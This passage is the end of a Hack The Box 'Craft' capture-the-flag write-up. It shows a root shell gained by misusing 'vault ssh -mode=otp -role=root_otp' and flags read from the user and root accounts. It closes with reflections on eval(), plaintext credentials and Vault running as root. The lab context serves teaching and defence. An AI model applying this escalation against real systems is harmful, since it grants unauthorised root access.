</span><span class="gp">Linux craft.htb 4.9.0-8-amd64 #</span>1 SMP Debian 4.9.130-2 <span class="o">(</span>2018-10-27<span class="o">)</span> x86_64
<span class="go">
</span><span class="gp">The programs included with the Debian GNU/Linux system are free software;</span><span class="w">
</span><span class="go">the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 13 18:45:12 2019 from 10.10.14.167
</span><span class="gp">gilfoyle@craft:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
<span class="go">bbf4b0cadfa3d4e6d0914c9cd5a612d4
</span><span class="gp">gilfoyle@craft:~$</span><span class="w">
</span></code></pre></div></div>

<p>After adding gilfoyle’s keys and using his password once again for <code class="highlighter-rouge">ssh-add</code>, you can see we gain the user flag. On to the root portion we go.</p>

<h2 id="root-flag">Root Flag</h2>
<p>Now we already know about something very important, and thats <code class="highlighter-rouge">vault</code>. After some research on how to craft the command we’re able to easily gain a root shell through this application.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">gilfoyle@craft:/$</span><span class="w"> </span>vault ssh <span class="nt">-mode</span><span class="o">=</span>otp <span class="nt">-role</span><span class="o">=</span>root_otp root@craft.htb
<span class="go">Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: 60fafe1c-2221-6dd7-d16f-9c6ba0c996eb


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Password:
</span><span class="gp">Linux craft.htb 4.9.0-8-amd64 #</span>1 SMP Debian 4.9.130-2 <span class="o">(</span>2018-10-27<span class="o">)</span> x86_64
<span class="go">
</span><span class="gp">The programs included with the Debian GNU/Linux system are free software;</span><span class="w">
</span><span class="go">the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 13 18:48:35 2019 from ::1
</span><span class="gp">root@craft:~#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
<span class="go">831d64ef54d92c1af795daae28a11591
</span><span class="gp">root@craft:~#</span><span class="w">
</span></code></pre></div></div>

<p>That’s all there is!</p>

<p><img src="/wp-content/uploads/2020/01/craft/rooted.png" alt="rooted" />
<strong>Figure 8:</strong> rooted.</p>

<h1 id="conclusion">Conclusion</h1>
<p>This box was fun from the beginning. I enjoyed going through the <code class="highlighter-rouge">Flask</code> code in the <code class="highlighter-rouge">git</code> repository to find a vulnerability, as well as finding the credentials and test script in an old commit. This gain of the initial foothold seemed to me to be <strong>very realistic</strong>. I’ve seen this type of mistake chain a lot in my years as a developer. Developing the exploit to get code execution was rather difficult (for me at least). Not knowing bash wasn’t installed held me up for quite a while on this phase.</p>

<p>I will say that storing credentials in plain text is probably almost as bad, or worse, than using the <code class="highlighter-rouge">eval()</code> function, but some people still do this crap too. Running vault as root is also a mistake, but a lazy developer may do too for one reason or another. All in all Craft has been my absolute favorite box thus far.</p>

<h1 id="references">References</h1>
<ol>
  <li><a href="http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html">http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html</a></li>
  <li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
  <li><a href="https://stackoverflow.com/questions/44250002/how-to-solve-sign-and-send-pubkey-signing-failed-agent-refused-operation">https://stackoverflow.com/questions/44250002/how-to-solve-sign-and-send-pubkey-signing-failed-agent-refused-operation</a></li>
  <li><a href="https://www.vaultproject.io/docs/commands/ssh.html">https://www.vaultproject.io/docs/commands/ssh.html</a></li>
</ol>

    



<div class="post-tags">
  
    
    <a href="/tags/#ctf">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">CTF</span>
    </a>
  
    
    <a href="/tags/#hack-the-box">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Hack The Box</span>
    </a>
  
    
    <a href="/tags/#linux">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Linux</span>
    </a>
  
    
    <a href="/tags/#privilege-escalation">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Privilege Escalation</span>
    </a>
  
    
    <a href="/tags/#python">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Python</span>
    </a>
  
    
    <a href="/tags/#code-execution">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Code Execution</span>
    </a>
  
    
    <a href="/tags/#gogs">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Gogs</span>
    </a>
  
    
    <a href="/tags/#git">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Git</span>
    </a>
  
    
    <a href="/tags/#vault">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Vault</span>
    </a>
  
</div>
  </div>

  
  <section class="comments">
    <h2>Comments</h2>
    
  <div id="disqus_thread">
    <button class="disqus-load" onClick="loadDisqusComments()">
      Load Comments
    </button>
  </div>
  <script>

  /**
  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW
  *  TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT:s
  *  https://disqus.com/admin/universalcode/#configuration-variables
  */
  var disqus_config = function () {
      this.page.url = "http://0.0.0.0:4000/hack-the-box-craft-writeup/";  // Replace PAGE_URL with your page's canonical URL variable
      this.page.identifier = "" || "http://0.0.0.0:4000/hack-the-box-craft-writeup/";// Replace PAGE_IDENTIFIER with your page's unique identifier variable
  }
  function loadDisqusComments() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = '//https-ryankozak-com.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
  }
  </script>
  <noscript>
    Please enable JavaScript to view the
    <a href="https://disqus.com/?ref_noscript">comments powered by Disqus</a>.
  </noscript>



  </section>

  <section class="related">
  <h2>Related Posts</h2>
  <ul class="posts-list">
    
      <li>
        <h3>
          <a href="/luks-encrypted-arch-linux-on-pinebook-pro/">
            Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root
            <small>15 Dec 2020</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box-craft-traceback/">
            Hack The Box - Traceback
            <small>17 Aug 2020</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box-craft-traverxec/">
            Hack The Box - Traverxec
            <small>12 Apr 2020</small>
          </a>
        </h3>
      </li>
    
  </ul>
</section>

</div>

    </main>

    
  </body>
</html>
